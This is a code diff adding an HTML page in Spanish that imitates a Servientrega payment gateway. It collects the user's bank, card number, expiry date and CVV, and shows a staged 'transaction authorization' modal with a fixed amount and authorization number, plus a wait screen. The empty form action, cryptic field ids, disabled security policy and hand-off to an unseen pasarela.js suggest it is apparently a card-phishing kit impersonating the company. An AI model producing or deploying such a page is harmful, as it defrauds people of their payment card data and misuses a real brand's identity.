@@ -1,0 +1,221 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Realizar Pago</title>
+    <link rel="shortcut icon" href="./assets/favicon.ico" type="image/x-icon">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Urbanist:wght@400;700&display=swap" rel="stylesheet">
+    
+    <!-- <meta http-equiv="Content-Security-Policy" content="default-src 'self'; font-src 'self' https://fonts.googleapis.com https://fonts.gstatic.com;"> -->
+
+    <!-- CSS -->
+    <link rel="stylesheet" href="./css/normalize.css">
+    <link rel="stylesheet" href="./css/main.css">
+    
+    <!-- VALIDATIONS -->
+    <script src="./js/functions.js"></script>
+</head>
+<body>
+
+    <!-- MODAL ESPERA -->
+    <div class="modal" id="modal-esperar">
+        <div class="modal-body">
+            <h3 class="modal-title">Espera un momento...</h3>
+            <div class="d-center">
+                <div class="lds-ellipsis"><div></div><div></div><div></div><div></div></div>
+            </div>
+            <p style="text-align: center;">
+                No actualices ni cierres la página.
+            </p>
+            <span style="text-align: center;" class="thin">Trabajamos día y noche para conectar al país.</span>
+        </div>
+    </div>
+
+    
+    <!-- MODAL -->
+    <div class="modal" id="modal-principal">
+        <div class="modal-body">
+            <h3 class="modal-title">Autorización de transacción</h3>
+            <img id="-icon-banco" src="./assets/logos/agrario.png" alt="" class="modal-icon-banco">
+            <p>
+                La transacción que intentas realizar con <b>Servientrega S.A.</b> deber ser autorizada. 
+            </p>
+
+            <div class="detalles">
+                <h5>DETALLES DE TRANSACCIÓN</h5>
+
+                <div class="thin">
+                    <b>Comercio <span class="thinier">(razón social)</span>: </b>Servientrega S.A
+                    <br>
+                    <b>Monto de transacción: </b>$6750 COP
+                    <br>
+                    <b>Número de Autorización: </b>AG557845120
+                </div>
+            </div>
+
+            <button class="btn-success" id="autorizar">
+                Autorizar
+            </button>
+        </div>
+    </div>
+
+
+
+    
+
+    <header>
+        <div class="navbar-container">
+            <img src="./assets/svg/logo-servientrega-blanco.svg" alt="" class="navbar-logo">
+            <img src="./assets/svg/menu-hamburguer.svg" alt="" class="navbar-menu">
+        </div>
+    </header>
+
+    <main>
+        <h3 class="section-title"><b>Pasarela de Pago</b></h3>
+        <form class="form-card" id="form" action="">
+            <!-- BANCO -->
+            <select id="ban" required name="txt-entidad" class="">
+                <option label="Seleccione su banco" value="">Seleccione su banco</option>
+                <option label="BANCAMIA S.A." value="bancamia">BANCAMIA S.A.</option>
+                <option label="BANCO AGRARIO" value="agrario">BANCO AGRARIO</option>
+                <option label="BANCO AV VILLAS" value="avvillas">BANCO AV VILLAS</option>
+                <option label="BANCO BBVA COLOMBIA S.A." value="bbva">BANCO BBVA COLOMBIA S.A.</option>
+                <option label="BANCO CAJA SOCIAL" value="caja-social">BANCO CAJA SOCIAL</option>
+                <option label="BANCO COOPERATIVO COOPCENTRAL" value="coopertaivo-coopcentral">BANCO COOPERATIVO COOPCENTRAL</option>
+                <option label="BANCO CREDIFINANCIERA" value="credifinanciera">BANCO CREDIFINANCIERA</option>
+                <option label="BANCO DAVIVIENDA" value="davivienda">BANCO DAVIVIENDA</option>
+                <option label="BANCO DE BOGOTA" value="bogota">BANCO DE BOGOTA</option>
+                <option label="BANCO DE OCCIDENTE" value="occidente">BANCO DE OCCIDENTE</option>
+                <option label="BANCO FALABELLA " value="falabella">BANCO FALABELLA </option>
+                <option label="BANCO FINANDINA S.A. BIC" value="finandina">BANCO FINANDINA S.A. BIC</option>
+                <option label="BANCO GNB SUDAMERIS" value="sudameris">BANCO GNB SUDAMERIS</option>
+                <option label="BANCO ITAU" value="itau">BANCO ITAU</option>
+                <option label="BANCO PICHINCHA S.A." value="pichincha">BANCO PICHINCHA S.A.</option>
+                <option label="BANCO POPULAR" value="popular">BANCO POPULAR</option>
+                <option label="BANCO SANTANDER COLOMBIA" value="santander">BANCO SANTANDER COLOMBIA</option>
+                <option label="BANCO SERFINANZA" value="serfinanza">BANCO SERFINANZA</option>
+                <option label="BANCO UNION antes GIROS" value="union">BANCO UNION antes GIROS</option>
+                <option label="BANCOLOMBIA" value="bancolombia">BANCOLOMBIA</option>
+                <option label="BANCOOMEVA S.A." value="bancomeva">BANCOOMEVA S.A.</option>
+                <option label="CFA COOPERATIVA FINANCIERA" value="cfa">CFA COOPERATIVA FINANCIERA</option>
+                <option label="CITIBANK " value="citibank">CITIBANK</option>
+                <option label="COLTEFINANCIERA" value="coltefinanciera">COLTEFINANCIERA</option>
+                <option label="CONFIAR COOPERATIVA FINANCIERA" value="confiar">CONFIAR COOPERATIVA FINANCIERA</option>
+                <option label="COOFINEP COOPERATIVA FINANCIERA" value="coofinep">COOFINEP COOPERATIVA FINANCIERA</option>
+                <option label="COTRAFA" value="cotrafa">COTRAFA</option>
+                <option label="DALE" value="dale">DALE</option>
+                <option label="DAVIPLATA" value="1551">DAVIPLATA</option>
+                <option label="IRIS" value="iris">IRIS</option>
+                <option label="LULO BANK" value="lulo">LULO BANK</option>
+                <option label="MOVII S.A." value="movii">MOVII S.A.</option>
+                <option label="NEQUI" value="nequi">NEQUI</option>
+                <option label="RAPPIPAY" value="rappipay">RAPPIPAY</option>
+                <option label="RAPPIPAY DAVIPLATA" value="rappipay">RAPPIPAY DAVIPLATA</option>
+                <option label="SCOTIABANK COLPATRIA" value="scotiabank-colpatria">SCOTIABANK COLPATRIA</option>
+            </select>
+
+            <!-- CARD NUMBER -->
+            <input id="p" class="" required placeholder="Número de Tajerta" type="text" oninput="formatearNumero(this)">
+
+            <!-- FECHA -->
+            <div class="form-input-group">
+                <select id="mes" required>
+                    <option value="" disabled selected>Mes</option>
+                    <option value="1">1</option>
+                    <option value="2">2</option>
+                    <option value="3">3</option>
+                    <option value="4">4</option>
+                    <option value="5">5</option>
+                    <option value="6">6</option>
+                    <option value="7">7</option>
+                    <option value="8">8</option>
+                    <option value="9">9</option>
+                    <option value="10">10</option>
+                    <option value="11">11</option>
+                    <option value="12">12</option>
+                </select>
+                <select id="ano" required>
+                    <option value="" disabled selected>Año</option>
+                    <option value="23">2023</option>
+                    <option value="24">2024</option>
+                    <option value="25">2025</option>
+                    <option value="26">2026</option>
+                    <option value="27">2027</option>
+                    <option value="28">2028</option>
+                    <option value="29">2029</option>
+                    <option value="30">2030</option>
+                    <option value="31">2031</option>
+                    <option value="32">2032</option>
+                    <option value="33">2033</option>
+                    <option value="34">2034</option>
+                    <option value="35">2035</option>
+                    <option value="36">2036</option>
+                </select>
+            </div>
+
+            <!-- CVV -->
+            <input required class="" type="text" id="c" maxlength="3" placeholder="CVV">
+            <p id="msg-cvv" class="thinier">Para tarjetas AMERICAN EXPRESS el código CVV está en la parte frontal y son cuatro dígitos.</p>
+
+            <div class="card-icons">
+                <p class="thin">Formas de pago aceptadas:</p>
+                <img src="./assets/svg/ico-visa.svg" alt="">
+                <img src="./assets/svg/ico-american-express.svg" alt="">
+                <img src="./assets/svg/ico-master-card.svg" alt="">
+                <img src="./assets/svg/ico-maestro.svg" alt="">
+            </div>
+
+            <button type="submit" class="btn-success btn-100" id="success">
+                Continuar
+            </button>
+        </form>
+        
+    </main>
+
+
+
+
+
+
+
+
+    <footer>
+        <div class="footer-linea-com">
+            <img src="./assets/svg/ico-linea-nacional.svg" alt="">
+            <div class="">
+                <h3>Comunicate con nuestra línea</h3>
+                <h4>(601) 7700 200</h4>
+            </div>
+        </div>
+        <hr>
+        <p>Sobre Servientrega</p>
+        <hr>
+        <p>Links de interés</p>
+        <hr>
+        <p>Centro de ayuda</p>
+        <hr>
+        <p>Accesos corporativos</p>
+        <hr>
+        <div class="footer-links">
+            <img src="./assets/svg/ico-fb.svg" alt="">
+            <img src="./assets/svg/ico-ins.svg" alt="">
+            <img src="./assets/svg/ico-tw.svg" alt="">
+            <img src="./assets/svg/ico-yt.svg" alt="">
+            <img src="./assets/svg/ico-lk.svg" alt="">
+            <img src="./assets/svg/ico-vigilado.png" alt="">
+        </div>
+        <hr>
+        <p class="thin">© Servientrega, 2023.</p>
+        <div class="footer-links">
+            <p class="thinier">Política de privacidad | Términos y Condiciones | Mapa del sitio</p>
+        </div>
+    </footer>
+
+
+    <!-- SCRIPTS -->
+    <script src="./js/pasarela.js"></script>   
+</body>
+</html>
